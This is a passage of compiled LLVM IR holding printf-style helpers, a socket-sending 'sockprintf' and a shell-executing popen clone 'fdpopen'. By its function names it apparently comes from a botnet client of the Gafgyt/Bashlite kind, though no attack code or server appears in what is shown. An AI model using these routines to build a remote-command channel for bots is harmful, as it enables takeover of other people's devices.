  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
